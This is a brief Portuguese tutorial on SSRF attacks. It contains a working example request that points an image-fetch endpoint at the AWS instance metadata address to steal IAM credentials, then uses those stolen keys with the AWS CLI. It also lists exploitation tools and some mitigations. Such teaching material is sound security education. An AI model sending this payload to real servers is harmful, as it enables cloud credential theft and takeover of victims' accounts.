# SSRF

🎯 O que é um ataque SSRF (Server-Side Request Forgery)?

Um ataque SSRF acontece quando um atacante engana o servidor para fazer uma requisição HTTP para um destino que o atacante escolher. O servidor vira um “proxy” involuntário, e isso pode ser usado para:
	•	Acessar recursos internos (ex: localhost, rede interna, serviços privados)
	•	Roubos de credenciais (ex: metadados da nuvem)
	•	Port scanning interno
	•	Escalonamento de privilégios

⸻

🧠 Exemplo prático – SSRF em nuvem (AWS)

🧪 Contexto:

Você encontra um app web que permite enviar uma URL para baixar uma imagem (ex: POST /fetch-image { "url": "https://exemplo.com/img.jpg" }).

Você então faz:

POST /fetch-image
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

👉 Isso atinge o Metadata Service da instância EC2 (endereço reservado da AWS), que retorna credenciais temporárias IAM.

Depois, com as credenciais:

aws configure
# Access Key ID: <roubada>
# Secret Access Key: <roubada>
# Region: us-east-1

E pronto — você pode interagir com a conta AWS da vítima com o nível de permissão que aquele perfil IAM tiver.

⸻

🛠️ Ferramentas úteis para exploração SSRF:

Ferramenta	Utilidade
Burp Suite	Teste de SSRF manual ou com Intruder/Repeater
SSRFmap	Exploração automatizada de SSRF, inclusive em cloud (https://github.com/swisskyrepo/SSRFmap)
gobuster / ffuf	Descoberta de parâmetros vulneráveis
Interactsh	Para detectar out-of-band SSRF


⸻

🧱 Como mitigar:
	•	Validar e sanitizar URLs de entrada
	•	Bloquear acesso a IPs internos (ex: 127.0.0.1, 169.254.169.254)
	•	Monitorar requisições de saída (egress)
	•	Usar web application firewalls (WAFs) com regras específicas

⸻